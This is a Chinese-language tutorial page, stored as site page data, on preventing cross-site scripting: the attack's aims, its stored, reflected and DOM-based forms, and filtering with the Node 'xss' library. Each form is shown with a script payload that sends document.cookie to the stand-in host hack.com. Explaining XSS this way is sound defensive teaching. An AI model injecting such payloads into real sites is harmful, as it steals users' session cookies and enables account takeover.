{
    "componentChunkName": "component---src-templates-article-article-detail-gen-js",
    "path": "/xss-defense",
    "result": {"data":{"strapiArticles":{"id":"Articles_404","title":"怎么防止跨站脚本攻击（XSS）？","description":"跨站脚本攻击（Cross-site scripting，XSS）是攻击者向网站注入恶意脚本，等待用户访问网站并自动运行恶意脚本发起攻击的过程。不同的脚本可以实现不同目的：\n\n- 盗用cookie，获取敏感信息。\n- 利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。\n- 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。\n- 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n- 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DoS攻击的效果。","content":"##### 一、XSS 是什么？\n\n跨站脚本攻击（Cross-site scripting，XSS）是攻击者向网站注入恶意脚本，等待用户访问网站并自动运行恶意脚本发起攻击的过程。不同的脚本可以实现不同目的：\n\n- 盗用cookie，获取敏感信息。\n- 利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。\n- 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。\n- 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n- 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DoS攻击的效果。\n\n---\n\n##### 二、XSS 分为3类\n\n###### 1、存储型（持久型）\n\n攻击者把恶意脚本注入服务器并存储起来，等待受害者请求此脚本并在浏览器中自动运行。\n\n- 使用场景：攻击者在评论区提交带有恶意脚本的评论，如果服务器检查不出恶意脚本，那么此恶意评论会被存入服务器数据库，下一个用户访问时，评论会被自动获取并展示，其中恶意脚本也被自动运行了。\n\n  ```js\n  // 在评论区，直接把下面的内容提交，如果服务器不做检查，下面内容就被存入服务器数据库\n  <script>location.href=\"http://hack.com/transfer?cookie=\"+document.cookie</script>\n  ```\n\n---\n\n###### 2、反射型（非持久型）\n\n通过用户点击恶意链接，获取用户已登录的会话cookie。\n\n```js\nhttp://www.example.com/transfer?s=<script>location.href=\"http://hack.com/transfer?cookie=\"+document.cookie</script>\n```\n\n---\n\n###### 3、DOM 型\n\n在用户浏览的页面中直接注入代码。\n\n- 实例：HTML中有个锚的功能，也就是通过 `#id` 来实现当页面的跳转。\n\n  ```\n  # 下面链接表示打开页面，并把 id 为 doc 这个元素滚到页面最上面\n  http://www.example.com/#doc\n  \n  # 把 doc 换成 脚本，再访问此页面，意味着脚本会被自动执行\n  http://www.example.com/#<script>location.href=\"http://hack.com/transfer?cookie=\"+document.cookie</script>\n  \n  # 备注：此实例只是解释说明用，目前浏览器早就屏蔽了这样的漏洞。\n  ```\n\n---\n\n##### 三、怎么防止  XSS 攻击？\n\nXSS 来源于用户提供的内容，只要过滤掉其中的恶意代码即可，Node.js 项目中推荐使用 `xss`  库来完成这个工作。\n\n```js\n// 1、安装\nnpm install xss\n\n// 2、使用\nvar xss = require('xss');\nvar html = xss('<script>alert(\"xss\");</script>');\nconsole.log(html);\n```\n\n- [xss - 官网](https://jsxss.com/zh/index.html)\n\n---\n\n##### 四、xss 相关工具\n\n- [xsshunter - 记录XSS攻击者的ip等详细信息](https://xsshunter.com/)\n\n- [XSStrike - 扫描网站的 XSS 漏洞](https://github.com/s0md3v/XSStrike)\n\n---\n\n##### 五、参考文档\n\n- [Cross-site_scripting - MDN](https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting)\n\n- [xss - owasp](https://owasp.org/www-community/attacks/xss/)\n\n- [DOM_Based_XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)\n\n- [A7_2017-Cross-Site_Scripting_(XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)\n- [wordpress-xss-attack](https://secure.wphackedhelp.com/blog/wordpress-xss-attack/)\n- [基于DOM的跨站脚本解释](https://www.acunetix.com/blog/articles/dom-xss-explained/)\n\n- [js-xss - 官网](https://jsxss.com/zh/index.html)\n\n- [js-xss - Github](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)\n\n- [Cross-site_scripting - wikiwand](https://www.wikiwand.com/en/Cross-site_scripting)\n\n- [如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)\n\n\n","url":"https://learn-anything.cn/xss-defense","published_at":"2021-11-23T23:48:36.000Z","tags":[{"name":"网络安全","slug":"network-security"},{"name":"JavaScript","slug":"java-script"}]},"site":{"siteMetadata":{"title":"收集优质资源","author":"@learn-anything.cn","description":"追求极简语言，说明事物因果！","email":"lh@learn-anything.cn"}}},"pageContext":{"title":"怎么防止跨站脚本攻击（XSS）？","slug":"xss-defense"}},
    "staticQueryHashes": ["63159454"]}